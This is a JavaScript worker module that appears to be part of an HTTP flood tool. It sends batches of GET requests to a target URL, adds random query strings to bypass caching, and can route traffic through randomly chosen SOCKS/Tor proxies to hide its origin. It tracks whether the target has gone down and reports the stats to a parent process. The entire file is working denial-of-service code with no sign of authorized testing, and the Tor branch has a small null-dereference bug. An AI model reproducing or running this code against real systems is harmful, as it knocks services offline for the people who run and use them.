import url from 'url';
import http from 'http';
import https from 'https';
import crypto from 'crypto';
import querystring from 'querystring';
import tr from 'tor-request';
import { DATA_MSG } from './constants.mjs';

const headers = { "content-type": "application/json", Connection: 'keep-alive' };

export async function request(targetUrl, userConfig) {
	const parsedUrl = url.parse(targetUrl);
	const data = {
		host: parsedUrl.host,
		port: parsedUrl.port,
		path: parsedUrl.path,
		requests: 0,
		errors: 0,
		success: 0,
		isDown: false
	};

	if (userConfig.socksProxies?.length) {
		const proxies = userConfig.socksProxies;
		const proxyIndex = Math.round(Math.random() * (proxies.length - 1));
		const parsedProxyUrl = url.parse(proxies[proxyIndex]);
		torRequestBatch(targetUrl, parsedProxyUrl, userConfig.requestPerBatch, data);
	} else {
		simpleRequestBatch(targetUrl, userConfig.requestPerBatch, data);
	}
}

function simpleRequestBatch(targetUrl, requestPerBatch, data) {
	const parsedUrl = url.parse(targetUrl);
	const path = parsedUrl.path;
	const options = { ...parsedUrl, headers };

	const httpOrHttps = options.protocol === 'https:' ? https : http;
	for (let i = 0; i < requestPerBatch; ++i) {
		options.path = path + '?' + querystring.stringify({
			data: crypto.randomBytes(20).toString('hex')
		});

		httpOrHttps.get(options, res => {
			++data.requests;
			if (res.statusCode >= 200 && res.statusCode < 300) {
				++data.success;
			} else {
				++data.errors;
			}

			process.send({ cmd: DATA_MSG, data });
		}).on('error', (err) => {
			++data.requests;
			++data.errors;
			if (err.connect === true) {
				data.isDown = true;
			}
			process.send({ cmd: DATA_MSG, data });
		});
	}
}

function torRequestBatch(targetUrl, parsedProxy, requestPerBatch, data) {
	for (let i = 0; i < requestPerBatch; ++i) {
		const qs = { data: crypto.randomBytes(20).toString('hex') };
		tr.setTorAddress(parsedProxy.hostname, parsedProxy.port);
		tr.request.get(targetUrl, { qs, headers }, (err, res) => {
			if (err || res?.statusCode < 200 || res?.statusCode >= 300) {
				++data.requests;
				++data.errors;
				if (err.connect === true) {
					data.isDown = true;
				}
				return process.send({ cmd: DATA_MSG, data });
			}

			++data.requests;
			++data.success;
			process.send({ cmd: DATA_MSG, data });
		});
	}
}